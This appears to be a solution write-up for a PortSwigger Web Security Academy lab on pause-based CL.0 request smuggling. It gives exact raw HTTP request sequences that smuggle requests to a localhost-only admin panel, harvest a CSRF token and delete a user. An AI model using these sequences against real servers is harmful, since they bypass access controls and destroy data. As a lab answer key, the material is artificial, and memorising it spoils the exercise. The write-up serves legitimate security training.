# SOLUTION — Server-side pause-based request smuggling (EXPERT)

**Target:** `https://0a33006004e7508b87be6c9a00f200dd.web-security-academy.net/`
**Result:** Lab **SOLVED** (verified via page status widget `is-solved`), user `carlos` deleted.

## The vulnerability

Pause-based CL.0 server-side desync (PortSwigger "Browser-Powered Desync Attacks" research):

- **Front-end** (Apache/2.4.52): streaming reverse proxy. Forwards client bytes to the back-end as they arrive. Per-request rule: `Path /admin* is blocked` → 403 JSON. Read timeout ≈ **120 s** → `400 {"error":"Read timeout"}` + close.
- **Back-end** (Apache/2.4.52): read timeout ≈ **60 s**. On timeout it *treats the partial request as complete (CL.0-like)*, issues a response **itself** (for `/resources`: a server-level 302 redirect, with no app headers), and **keeps the connection open** (the "some endpoints" in the lab text = server-level-redirect endpoints).
- The back-end's `/admin` is hidden from the front-end's public surface (front-end 403) and additionally only serves real content when `Host: localhost` ("only accessible to local users" check).

**Desync:** send request 1's headers promising a body (`POST /resources`, `Content-Length: L`), pause >60 s so the back-end times out (CL.0-like) while the front-end (120 s) is still inside request 1, then send `L` bytes. Front-end treats them as request 1's body (never applies its /admin block); back-end — already responded — parses them as a **new request**.

**Response plumbing quirk (discovered empirically):** the front-end pairs back-end responses with client requests in order. A smuggled request's response is delivered as the response to the *next* client request on the connection — so a **sacrificial follow-up request** is required to observe smuggled responses in-band.

## Exact attacks

Both over one raw TLS/HTTP/1.1 socket (ALPN `http/1.1`), no cookies.

### Attack 1 — harvest CSRF (admin panel)
```
POST /resources HTTP/1.1
Host: 0a33006004e7508b87be6c9a00f200dd.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
<-- PAUSE 62 s -->
GET /admin/ HTTP/1.1
Host: localhost
<-- +0.1 s (sacrificial) -->
GET / HTTP/1.1
Host: 0a33006004e7508b87be6c9a00f200dd.web-security-academy.net
```
Client receives: `302` (back-end timeout redirect) then **200 admin panel (3149 B)** containing
`<input required type="hidden" name="csrf" value="vIGaa2…">` and the delete form (`action='/admin/delete'`, `username`).

### Attack 2 — delete carlos
```
POST /resources HTTP/1.1
Host: 0a33006004e7508b87be6c9a00f200dd.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 159
<-- PAUSE 62 s -->
POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=vIGaa2…&username=carlos<-- +0.1 s (sacrificial) -->
GET / HTTP/1.1
Host: 0a33006004e7508b87be6c9a00f200dd.web-security-academy.net
```
Client receives: `302` (timeout redirect) then **302** (delete handler redirect) → lab state flips to **Solved**.

## Evidence chain (key files)
- `evidence/b2_H1_mech_404plusHome.txt` — desync mechanism proof (smuggled `GET /hopefully404` → back-end 302 `/hopefully404/` delivered in-band).
- `evidence/battery_F_pause130_CL39.txt` — front-end 120 s timeout (`400 {"error":"Read timeout"}` + close).
- `evidence/resp_probe_p30_0.bin` vs `evidence/resp_probe_p65_0.bin` — normal 302 (w/ XFO) vs back-end timeout 302 (no XFO).
- `evidence/battery_A/B/G*.txt` — front-end per-request `/admin` block (why CL:0 trick 403s on current lab).
- `logs/exploit1.log` — full run: CSRF harvested; 2023 walkthrough token → `400 "Invalid CSRF token"`; final delete → 302; **LAB SOLVED? True**.
- `responses/status_final.html` — post-delete page: `widgetcontainer-lab-status is-solved`, `<p>Solved</p>`.
- `requests/attack*_FULL_BYTES.txt` — exact bytes on the wire.

## Why the 2023 walkthrough needed adapting
- Its CL.0 variant relied on the front-end not blocking the smuggled request; the current front-end applies the `/admin` block **per request**, so CL.0 smuggled requests 403. Using a **nonzero CL** keeps smuggled bytes "body" in the front-end's bookkeeping → no block.
- Its CSRF token was instance-specific (this instance: `vIGaa2…`); must be harvested.
- In-band observation of smuggled responses requires the sacrificial follow-up request (response-order pairing).
